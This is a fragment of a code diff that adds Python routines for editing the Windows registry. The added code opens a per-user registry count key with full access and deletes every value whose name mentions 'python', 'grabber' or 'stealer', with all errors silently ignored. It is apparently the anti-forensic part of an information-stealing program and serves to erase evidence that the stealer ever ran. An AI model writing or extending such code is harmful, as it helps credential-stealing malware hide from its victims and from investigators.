+                        count_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, count_key_path, 0, winreg.KEY_ALL_ACCESS)
+                        
+                        values_to_delete = []
+                        try:
+                            i = 0
+                            while True:
+                                try:
+                                    value_name, value_data, value_type = winreg.EnumValue(count_key, i)
+                                    if any(keyword in value_name.lower() for keyword in ['python', 'grabber', 'stealer']):
+                                        values_to_delete.append(value_name)
+                                    i += 1
+                                except OSError:
+                                    break
+                        except:
+                            pass
+                        
+                        for value_name in values_to_delete:
+                            try:
+                                winreg.DeleteValue(count_key, value_name)
+                            except:
+                                pass
+                        
+                        winreg.CloseKey(count_key)
+                    except:
+                        pass
+            except:
+                pass
+                
         except:
             pass
 
